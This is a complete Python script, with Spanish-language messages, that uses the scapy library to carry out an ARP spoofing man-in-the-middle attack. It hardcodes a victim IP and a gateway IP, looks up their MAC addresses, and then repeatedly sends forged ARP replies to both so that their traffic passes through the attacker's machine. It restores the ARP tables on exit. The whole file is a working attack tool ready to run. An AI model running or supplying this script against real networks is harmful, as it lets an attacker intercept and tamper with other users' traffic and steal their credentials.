#!/usr/bin/env python3
from scapy.all import *
import time
import sys
import signal

VICTIMA_IP = "23.72.0.3"
GATEWAY_IP = "23.72.0.1"
INTERFACE = "eth0"

victim_mac = None
gateway_mac = None
conf.verb = 0

def get_mac(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            return None
    except Exception as e:
        print(f"[-] Error al obtener MAC para {ip}: {e}")
        return None

def restore(target_ip, target_mac, source_ip, source_mac):
    try:
        print(f"[*] Restaurando ARP para {target_ip}...")
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=3, verbose=False)
        print(f"[+] ARP restaurado para {target_ip}")
    except Exception as e:
        print(f"[-] Error al restaurar ARP para {target_ip}: {e}")

def spoof(target_ip, target_mac, source_ip):
    try:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=get_if_hwaddr(INTERFACE))
        send(packet, verbose=False)
    except Exception as e:
        print(f"[-] Error al enviar paquete spoof: {e}")

def signal_handler(sig, frame):
    print("\n[!] Deteniendo el ataque y restaurando la red...")
    restore(VICTIMA_IP, victim_mac, GATEWAY_IP, gateway_mac)
    restore(GATEWAY_IP, gateway_mac, VICTIMA_IP, victim_mac)
    print("[+] Red restaurada. Saliendo.")
    sys.exit(0)

def main():
    global victim_mac, gateway_mac
    signal.signal(signal.SIGINT, signal_handler)

    print("--- Script de ARP Spoofing (MitM) ---")
    print(f"[*] Interfaz de red: {INTERFACE}")
    print(f"[*] Víctima: {VICTIMA_IP}")
    print(f"[*] Gateway: {GATEWAY_IP}")

    print("[*] Obteniendo direcciones MAC...")
    victim_mac = get_mac(VICTIMA_IP)
    gateway_mac = get_mac(GATEWAY_IP)

    if victim_mac is None or gateway_mac is None:
        print("[-] No se pudo obtener la MAC de la víctima o del gateway. Asegúrate de que están en la red.")
        sys.exit(1)

    print(f"[+] MAC Víctima: {victim_mac}")
    print(f"[+] MAC Gateway: {gateway_mac}")

    print("\n[!] Iniciando el ataque ARP Spoofing... Presiona Ctrl+C para detener.")
    try:
        sent_packets_count = 0
        while True:
            spoof(VICTIMA_IP, victim_mac, GATEWAY_IP)
            spoof(GATEWAY_IP, gateway_mac, VICTIMA_IP)
            sent_packets_count += 2
            if sent_packets_count % 50 == 0:
                sys.stdout.write(f"\r[*] Paquetes enviados: {sent_packets_count}")
                sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        signal_handler(signal.SIGINT, None)

if __name__ == "__main__":
    main()